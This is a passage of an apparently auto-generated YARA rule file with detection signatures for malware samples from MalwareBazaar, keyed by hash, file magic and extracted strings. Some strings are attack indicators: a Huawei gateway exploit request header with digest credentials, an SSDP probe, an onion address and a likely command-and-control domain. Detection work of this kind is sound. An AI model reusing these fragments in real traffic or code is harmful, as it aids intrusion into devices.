        description = "Auto ML: dfc2549bb01c896ce859ef5b081d26128ea36cf31321450ec9c3b89f6fbcd620"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Kerberos*"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 825KB
        and all of them
}

rule Windows_dfebde9ad6b1591c0044fcfbf6336cb9a9088409179055e4d438cd95b4d7bda0
{
    meta:
        description = "Auto ML: dfebde9ad6b1591c0044fcfbf6336cb9a9088409179055e4d438cd95b4d7bda0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "Boolean"
        $s3 = "AnsiCharG"
        $s4 = "ShortInt"
        $s5 = "m/Ca&in"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1426KB
        and all of them
}

rule Linux_e00fdd6b753f80a4688051fe0cb15ffdba32e0b6b2b5a964df823dddedb88fd2
{
    meta:
        description = "Auto ML: e00fdd6b753f80a4688051fe0cb15ffdba32e0b6b2b5a964df823dddedb88fd2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "#3a qR!a"
        $s2 = "b4r3a q"
        $s3 = "b4r3a,q"
        $s4 = "c4s2a1R"
        $s5 = "#3a qb!q"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 110KB
        and all of them
}

rule Linux_e025be16dfc6029be596ed64e16f43170346ec2a25c98310a22106b324dee0e4
{
    meta:
        description = "Auto ML: e025be16dfc6029be596ed64e16f43170346ec2a25c98310a22106b324dee0e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "XScW4M"
        $s2 = "d)P\"C%C"
        $s3 = "g{p++mK"
        $s4 = "ru}4ogP[d{"
        $s5 = "dW[pQ?|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 5KB
        and all of them
}

rule Windows_e065974b0db0079fcc57cf5d209fa267c852772a58a68cee307a72c91d382a8e
{
    meta:
        description = "Auto ML: e065974b0db0079fcc57cf5d209fa267c852772a58a68cee307a72c91d382a8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "`DX Yp"
        $s4 = "c ewe>a~"
        $s5 = "Y PGk*a~"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3792KB
        and all of them
}

rule Windows_e0b37708bdad729d029e1992be9559e65e957b756185e7ed783369add1a6ea6c
{
    meta:
        description = "Auto ML: e0b37708bdad729d029e1992be9559e65e957b756185e7ed783369add1a6ea6c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 13281KB
        and all of them
}

rule Windows_15931de8e192e8932d881c6d450d52090f92f9b5e9f0f0b903cc5ec033b58b54
{
    meta:
        description = "Auto ML: 15931de8e192e8932d881c6d450d52090f92f9b5e9f0f0b903cc5ec033b58b54"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "`j*rub"
        $s5 = "!UUUUUUUU"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB
        and all of them
}

rule Windows_e0ba5aa714833106f411e75729d0a77044778dc55858e3a3701d9a4966c380e1
{
    meta:
        description = "Auto ML: e0ba5aa714833106f411e75729d0a77044778dc55858e3a3701d9a4966c380e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4755KB
        and all of them
}

rule Windows_e0d805f837db16902f58d0421831b2a8ee491d67b24c447ff8bcbb15784fae3c
{
    meta:
        description = "Auto ML: e0d805f837db16902f58d0421831b2a8ee491d67b24c447ff8bcbb15784fae3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "ffefeeffefea("
        $s5 = "fefefeffea"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 243KB
        and all of them
}

rule Windows_e1179516c0fe8cbf69566d5db63c6d1d7d02d67b04eae5800f9a950fb07fee81
{
    meta:
        description = "Auto ML: e1179516c0fe8cbf69566d5db63c6d1d7d02d67b04eae5800f9a950fb07fee81"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "QgWj.[5k"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 508KB
        and all of them
}

rule Windows_e13f7cea04b3dacdca15e10bdee19e52b0f0bee02ed6a32971d92d1089ff49e5
{
    meta:
        description = "Auto ML: e13f7cea04b3dacdca15e10bdee19e52b0f0bee02ed6a32971d92d1089ff49e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "U>ukU?u"
        $s3 = "URich>u"
        $s4 = "`.rdata"
        $s5 = "@.data"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3672KB
        and all of them
}

rule Windows_e199b649f562ee61d10b1f77a77fef2a3bf0c1f870e4aa9958402a4059f2fa1c
{
    meta:
        description = "Auto ML: e199b649f562ee61d10b1f77a77fef2a3bf0c1f870e4aa9958402a4059f2fa1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Boolean"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2547KB
        and all of them
}

rule Windows_e1a098790e575bfbdde1957b2287912df823590042759fdf8e5e2adc26857137
{
    meta:
        description = "Auto ML: e1a098790e575bfbdde1957b2287912df823590042759fdf8e5e2adc26857137"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<datetimeMenu_SelectedIndexChanged>b__13_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 561KB
        and all of them
}

rule Windows_e1da3baddbcf9c26f51c48c828a7fac1f621d885860c7166529ffe64d2b149be
{
    meta:
        description = "Auto ML: e1da3baddbcf9c26f51c48c828a7fac1f621d885860c7166529ffe64d2b149be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "x3412lT8g9OI6goxcDYmHeyEl1PcAZkfHVAVPSRW4W0mpGQOztuAxe68qM473v00"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 66KB
        and all of them
}

rule Windows_e20841eb14d1bfb4c03ec93b7d41e21136fb172ae4d3129941ae40c73abaafa2
{
    meta:
        description = "Auto ML: e20841eb14d1bfb4c03ec93b7d41e21136fb172ae4d3129941ae40c73abaafa2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8323KB
        and all of them
}

rule Windows_e21cbcbb1005efb933b99b1e09a12c333b1fadc391ebde3e1261b83559082455
{
    meta:
        description = "Auto ML: e21cbcbb1005efb933b99b1e09a12c333b1fadc391ebde3e1261b83559082455"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "com.apple.Safari"
        $s5 = "Unable to resolve HTTP prox"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 235KB
        and all of them
}

rule Windows_e240139a207773b24047ce352998870ba5db138ddeee2f03983e2e0b95ba7cdb
{
    meta:
        description = "Auto ML: e240139a207773b24047ce352998870ba5db138ddeee2f03983e2e0b95ba7cdb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 637KB
        and all of them
}

rule Windows_15b386a6b3114004205aec7e70b00065aa7f847ca3de172cb3d0e0566a91ce20
{
    meta:
        description = "Auto ML: 15b386a6b3114004205aec7e70b00065aa7f847ca3de172cb3d0e0566a91ce20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "* TFsU*"
        $s5 = "uBrP*s"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5502KB
        and all of them
}

rule Linux_e24e13274eb611c22cbf4f339e8f80a346e3f6e9435a6f212b6a53254bed47fd
{
    meta:
        description = "Auto ML: e24e13274eb611c22cbf4f339e8f80a346e3f6e9435a6f212b6a53254bed47fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "sGG[W6"
        $s4 = "SOOq0f"
        $s5 = "g_vwDP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 53KB
        and all of them
}

rule Windows_e24f84235d063a70edbd6965a5e3639368e87a6ab7cccd661e49c07a0439d0bd
{
    meta:
        description = "Auto ML: e24f84235d063a70edbd6965a5e3639368e87a6ab7cccd661e49c07a0439d0bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich3%"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 418KB
        and all of them
}

rule Windows_e296340b2b842ca4367266701deccfa2eb1105a87bca21db8820fd17a07867de
{
    meta:
        description = "Auto ML: e296340b2b842ca4367266701deccfa2eb1105a87bca21db8820fd17a07867de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4555KB
        and all of them
}

rule Windows_e339907b677c77e7f0b7c91317404399f713d36526b2b2767d3eaae65099943b
{
    meta:
        description = "Auto ML: e339907b677c77e7f0b7c91317404399f713d36526b2b2767d3eaae65099943b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 618KB
        and all of them
}

rule Windows_e341875335ab0192719a7a17c39dd43fe185be56d7dff52c8434525489523007
{
    meta:
        description = "Auto ML: e341875335ab0192719a7a17c39dd43fe185be56d7dff52c8434525489523007"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3393KB
        and all of them
}

rule Linux_e348669f43d0f2f0d3086f1eb8d6f9a8dc25a126751abef26a1b366d230dc2e4
{
    meta:
        description = "Auto ML: e348669f43d0f2f0d3086f1eb8d6f9a8dc25a126751abef26a1b366d230dc2e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 193KB
        and all of them
}

rule Linux_e38d9aafca1585cd213d03ac642918cd37b2f0dc52415fd13fdb038048515c21
{
    meta:
        description = "Auto ML: e38d9aafca1585cd213d03ac642918cd37b2f0dc52415fd13fdb038048515c21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "jfXPQW"
        $s2 = "SCSj"
        $s3 = "Nt=h"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1KB
        and all of them
}

rule Linux_e3b86b018dd2ab1f24426797cf4cb4cf0adbabc57e1f359b46233176dc590938
{
    meta:
        description = "Auto ML: e3b86b018dd2ab1f24426797cf4cb4cf0adbabc57e1f359b46233176dc590938"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 141KB
        and all of them
}

rule Windows_e3cdb09481565d89e6123cf4145a1291d7abeac808d2f19364f9a3e04c3e1ccc
{
    meta:
        description = "Auto ML: e3cdb09481565d89e6123cf4145a1291d7abeac808d2f19364f9a3e04c3e1ccc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4760KB
        and all of them
}

rule Windows_e3d5437ab324ea9edf537a1e22032cbe89455ebb52ca40a61d5e68c325fc578f
{
    meta:
        description = "Auto ML: e3d5437ab324ea9edf537a1e22032cbe89455ebb52ca40a61d5e68c325fc578f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "wavsupply_kcsupreme_resurgence_grossbank"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4033KB
        and all of them
}

rule Linux_15c433828847f09df5b0fa973969b28f020fc34661025819b1fd70cd0c9ac9ef
{
    meta:
        description = "Auto ML: 15c433828847f09df5b0fa973969b28f020fc34661025819b1fd70cd0c9ac9ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "apple.bbos.ink"
        $s2 = "Roger That"
        $s3 = "gxgvoh5yljp2v2hvyiztzjhhuveaygcejp54y5gts2dnntdjexrkm2ad.onion"
        $s4 = "HTTP/1.1"
        $s5 = "/proc/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB
        and all of them
}

rule Windows_e411f99065fcc88640aa59af80d78e7f593389530916f7461bd63e3edc2413dd
{
    meta:
        description = "Auto ML: e411f99065fcc88640aa59af80d78e7f593389530916f7461bd63e3edc2413dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "wa WZVwa}`"
        $s5 = "QD#a}s"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1723KB
        and all of them
}

rule Windows_e4483d851c0dbc14d70fe4f6b961eaa94fc27acf8f4005fda0cf2b7cb665c695
{
    meta:
        description = "Auto ML: e4483d851c0dbc14d70fe4f6b961eaa94fc27acf8f4005fda0cf2b7cb665c695"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".hofoli"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 289KB
        and all of them
}

rule Windows_e4615b74d62f384d23e58bc467c615b17779e4f8084c8a0134db97a5e642027f
{
    meta:
        description = "Auto ML: e4615b74d62f384d23e58bc467c615b17779e4f8084c8a0134db97a5e642027f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "P.idata"
        $s5 = "@.didata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14938KB
        and all of them
}

rule Windows_e46cf506bfb4234c04ff59e043986e5a3b2ff8fa04c316aefdc0d0c0e72a2c18
{
    meta:
        description = "Auto ML: e46cf506bfb4234c04ff59e043986e5a3b2ff8fa04c316aefdc0d0c0e72a2c18"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.textbss"
        $s3 = ".rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 449KB
        and all of them
}

rule Windows_e47783b37ffa50108e4447b9a0e10d608b07944c9a00505ae14bda00ffcd5d86
{
    meta:
        description = "Auto ML: e47783b37ffa50108e4447b9a0e10d608b07944c9a00505ae14bda00ffcd5d86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4469KB
        and all of them
}

rule Windows_e47adcbfc33657d6751d44bde7860ae8e46fdc0aa328614d2adf27fe3e32720b
{
    meta:
        description = "Auto ML: e47adcbfc33657d6751d44bde7860ae8e46fdc0aa328614d2adf27fe3e32720b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "CompilationRelaxationsAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB
        and all of them
}

rule Windows_e47d112f2d69f2f2d49a34a4857604e11bb89ba9c8f24f46fe6ae8bbe9c31b83
{
    meta:
        description = "Auto ML: e47d112f2d69f2f2d49a34a4857604e11bb89ba9c8f24f46fe6ae8bbe9c31b83"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.rsrc"
        $s5 = "URPQQh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3579KB
        and all of them
}

rule Linux_e4a24a35afb9a76845914a9215404bead4b73b36f9a6a9a88f8ee7d6bba48ae0
{
    meta:
        description = "Auto ML: e4a24a35afb9a76845914a9215404bead4b73b36f9a6a9a88f8ee7d6bba48ae0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Content-Length: 430"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 125KB
        and all of them
}

rule Windows_e4a811441488a49a640f234d4e514d6746ad7ea39c4f1fe750182a358acc4d0d
{
    meta:
        description = "Auto ML: e4a811441488a49a640f234d4e514d6746ad7ea39c4f1fe750182a358acc4d0d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Portions Copyright (c) 1999,2003 Avenger by NhT"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5155KB
        and all of them
}

rule Windows_e4b81a5e79ff5b6ba6f6eda3b8bda8172409ac2165a23dba8d04f717adf07577
{
    meta:
        description = "Auto ML: e4b81a5e79ff5b6ba6f6eda3b8bda8172409ac2165a23dba8d04f717adf07577"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB
        and all of them
}

rule Linux_01c6a49061ce6552a560ad15ce8b0b07f2655bf7e5e917e6f37efacbde4d0572
{
    meta:
        description = "Auto ML: 01c6a49061ce6552a560ad15ce8b0b07f2655bf7e5e917e6f37efacbde4d0572"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRh(Y"
        $s2 = "D$TPh("
        $s3 = "E$VRWP"
        $s4 = "xAPPSh"
        $s5 = "D$,Phx"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 98KB
        and all of them
}

rule Linux_15e3ab21fd0421032745734a0e1f788934785da7fec500914da23894b37bbfec
{
    meta:
        description = "Auto ML: 15e3ab21fd0421032745734a0e1f788934785da7fec500914da23894b37bbfec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"
        $s2 = "<!: acam"
        $s3 = "t#5't<1&1t8;8T"
        $s4 = "nt5$$81 t:; t2;!:0T"
        $s5 = "{6=:{6!'-6;,t?=88tymtT"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 129KB
        and all of them
}

rule Windows_e4ba43dc277e470e668df7507af2bdb30c7bca40393e5f76a096408f1e04cb5c
{
    meta:
        description = "Auto ML: e4ba43dc277e470e668df7507af2bdb30c7bca40393e5f76a096408f1e04cb5c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1953KB
        and all of them
}

rule Windows_e4bfddcd30b8deab9039af5713b550132fa1603d6104eb5218b3eac0dfe835be
{
    meta:
        description = "Auto ML: e4bfddcd30b8deab9039af5713b550132fa1603d6104eb5218b3eac0dfe835be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "InnosUJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4758KB
        and all of them
}

rule Linux_e4bfdf450f02733fd21e24d0bab012f263f5366fe62a922248dc45c3d42accad
{
    meta:
        description = "Auto ML: e4bfdf450f02733fd21e24d0bab012f263f5366fe62a922248dc45c3d42accad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cgvLI8"
        $s2 = "iVAjTC"
        $s3 = "MU'rfB2@ZH]"
        $s4 = "nCym%&"
        $s5 = "qcu.G,B"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1168KB
        and all of them
}

rule Linux_e4c60f1c969ea093b535974d9357749d73c99d1e232972538978c94e9e495ec9
{
    meta:
        description = "Auto ML: e4c60f1c969ea093b535974d9357749d73c99d1e232972538978c94e9e495ec9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "6 qE,e%y"
        $s2 = "mdYqIm"
        $s3 = "gF< p7B"
        $s4 = "f1nbZz{"
        $s5 = "Qg1Hl#hd"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 57KB
        and all of them
}

rule Windows_e5035e4cba47e08ae750fb3fb85dc943d86604d7ab665e605a1842cbc9e1edce
{
    meta:
        description = "Auto ML: e5035e4cba47e08ae750fb3fb85dc943d86604d7ab665e605a1842cbc9e1edce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
